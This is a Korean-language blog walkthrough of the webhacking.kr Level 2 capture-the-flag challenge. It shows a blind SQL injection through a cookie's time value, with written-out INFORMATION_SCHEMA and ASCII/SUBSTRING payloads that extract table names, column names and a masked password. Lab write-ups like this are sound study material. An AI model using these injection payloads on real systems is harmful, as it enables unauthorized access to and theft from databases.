---
layout: post
title: Webhacking.kr | Level 2
subtitle: Webhacking CTF Problem Solving
categories: Webhacking
tags: [Pentest, Web]
---

**본 문제는 [webhacking.kr](https://webhacking.kr)를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184468666-81b467c7-d063-47a8-b468-d8123ba495b4.jpg" width = 350>
</p>

들어가면 제한된 구역이라며 자신의 IP를 남기고 있다고 하네요.

### 소스 코드

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184468866-a9d66914-85bf-417a-ba59-0ee2b2846925.jpg" width = 350>
</p>

Cookie에 time값이 있는데 주석에 나온 시간은 현재 시간과 맞지 않는 것을 알 수 있다. 

그리고 **admin.php**에 접속이 가능할 것으로 보인다!

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184469050-2b65235f-e880-44ef-8040-6d2014791cef.jpg" width = 350>
</p>

접속하면 패스워드를 입력할 수 있는 Textarea가 존재한다.

## 문제 풀이

SQL 인젝션으로 가능할 것 같아서 `OR 1=1 --`를 비롯한 대부분의 인젝션을 진행했지만 아무 것도 나오지 않았다.

PHP 파일로 존재하므로 여기에 넣은 값을 데이터베이스에서 비교 하는 것은 당연하다. 그러면 존재하는 데이터베이스를 확인해야 할 것으로 보이는데 Cookie의 **time**으로 변할 것으로 예상되므로 확인해본다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184469634-4e6cebf4-1e60-4f46-87bb-3b81c78618e1.jpg" width = 560>
</p>

**Burp Suite**로 Cookie의 Time 값을 '1'로 변경했을 때 주석의 시간이 **2070-01-01 09:00:01**로 변경하는 것을 확인했다.

* Time을 2로 변경하면 **2070-01-01 09:00:02**로 변경되고, 3이면 **2070-01-01 09:00:03**이다.

* Time의 값이 시간 주석 값을 변경하는 것을 알 수 있다.

우리가 입력한 값에 의해 초가 변경 된 것을 알 수 있으므로, 현재 데이터베이스에서 테이블의 개수가 몇인지 구해본다.

### 테이블 개수

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184470543-c7cad9a2-8e33-4956-9037-b92357f4513b.jpg" width = 560>
</p>

```SQL
(SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE());
```

현재 사용 중인 데이터베이스에서 사용중인 테이블의 개수를 출력하는 것으로 총 **2개**라 나왔다.

그렇다면, 이제 각 테이블의 이름 길이를 확인한 후 출력하는 방식이 시간으로 나오므로 한 글자씩 아스키코드로 출력하여 값을 확인하면 될 것으로 보인다.

### 테이블 이름 길이

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184470584-1f55ccf3-4721-48f6-82c9-7e1b6318d162.jpg" width = 560>
</p>

```SQL
(SELECT LENGTH(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() LIMIT 0, 1);
```

첫 테이블의 길이는 총 **13자리**임을 알 수 있다. 

> `LIMIT 1, 1`로 변경해서 두번째 테이블의 길이도 **3자리**임을 알 수 있다.

* LIMIT 사용법

예를 들어, 테이블에서 10개의 데이터만 가져오는 SELECT 문장을 만들기 위해서는 아래처럼 사용하면 된다.

```SQL
-- 행 데이터 10개만 조회하기
SELECT COLUMNS FROM TABLES LIMIT 10;
```

### 테이블 이름

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184470886-9a36e513-4316-4971-9688-3e0d014beb00.jpg" width = 560>
</p>

```SQL
SELECT ASCII(SUBSTRING(TABLE_NAME, 1, 1)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() LIMIT 0, 1
```

테이블 이름의 첫 글자를 가져와 아스키코드로 뽑아서 나온 값이 1분 37 즉, **97**이라는 뜻이다. 아스키코드 표를 보면 97 = **'a'**라는 것이다.

우리는 이것을 13글자까지 일일이 늘리면서 해야 한다. 하지만, Burp Suite에 Intruder를 이용하는 법과 스크립트를 작성하는 법이 있다.


* **First Table Name = a d - - - - - - - - - - -**

* **Second Table Name = l - -**

필자는 Intruder로 값을 확인했고, 스크립트로도 정확한 값이 나오는지 확인해보기 위해서 짰는데 값을 정확하게 나왔다. 스크립트는 [링크](https://github.com/peoplstar/peoplstar.github.io/blob/main/assets/python/Webhacking_2_Table_name.py)를 걸겠지만 직접 해보는 것을 추천한다.

### 칼럼 개수

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184472134-4d5916cb-7d8d-476a-aa66-babd190c8953.jpg" width = 560>
</p>

**ad-----------** 테이블에는 총 한개의 칼럼만 존재한다. 그렇다면 해당 칼럼의 이름의 글자수와 값을 테이블에서 했던 것과 같이 스크립트나 Intruder로 알아내면 문제 풀이는 끝날 것으로 보인다.

### 칼럼 이름

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184472134-4d5916cb-7d8d-476a-aa66-babd190c8953.jpg" width = 560>
</p>

```SQL
(SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "ad-----------")

(SELECT LENGTH(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "ad-----------")
```

칼럼 개수에서 이용한 SQL 문제에서 `COUNT`를 `LENGTH`로 바꾸면 칼럼의 글자 수는 두 자리인 것을 알 수 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184473442-fb4c7ae7-e1a7-4791-8889-2a2b8edc9062.jpg" width = 560>
</p>

```SQL
(SELECT LENGTH(column_name) FROM ad___________)
```

해당 칼럼의 데이터 길이는 17자리다.

```SQL
SELECT ASCII(SUBSTRING(column_name, 1, 1) FROM ad___________)
```

계속 1씩 증가하면서 똑같이 진행하면 패스워드가 나온다.

* **패스워드 : **k u - - - - - - - - - - - - - - -**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/184473746-5b2e0f89-5f52-46a2-93f5-b9eea8ae02fa.jpg" width = 350>
</p>

이번 문제는 쿠키를 통한 SQL 인젝션으로 문제 풀이 하는것이였다.

SQL에 대해서 **information_schema**가 무엇인지 다시 한번 알게 되고, 모두가 한번씩 직접 스크립트를 짜보면서 해보는 것을 추천한다.